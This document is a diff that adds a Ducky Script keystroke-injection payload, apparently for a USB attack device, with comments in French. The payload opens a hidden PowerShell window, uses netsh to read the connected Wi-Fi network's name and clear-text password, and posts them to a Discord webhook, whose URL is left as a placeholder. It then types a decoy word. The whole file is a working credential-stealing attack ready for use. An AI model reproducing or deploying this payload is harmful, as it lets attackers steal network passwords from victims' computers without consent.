@@ -1,0 +1,23 @@
+DELAY 500
+REM Démarrer l'exécution avec la touche GUI (touche Windows)
+GUI r
+DELAY 100
+
+REM Taper et exécuter PowerShell en mode caché
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 500
+REM # Récupère le nom du profil et le mot de passe du réseau Wi-Fi connecté, et envoie au Webhook Discord
+STRING $profileName = (netsh wlan show interfaces | Select-String -Pattern "^....SSID" | ForEach-Object { $_.ToString().Split(":")[1].Trim() })
+ENTER
+DELAY 500
+STRING $wifiPassword = (netsh wlan show profile name="$profileName" key=clear | Select-String -Pattern "Contenu de la cl\u00e9" | ForEach-Object { $_.ToString().Split(":")[1].Trim() })
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -Uri "YOUR WEBHOOK HERE" -Method Post -ContentType "application/json" -Body (ConvertTo-Json -InputObject @{ content = "SSID: $profileName`nPassword: $wifiPassword" })
+ENTER
+DELAY 500
+
+REM Écrire "bjr" dans Notepad
+STRING bjr
+
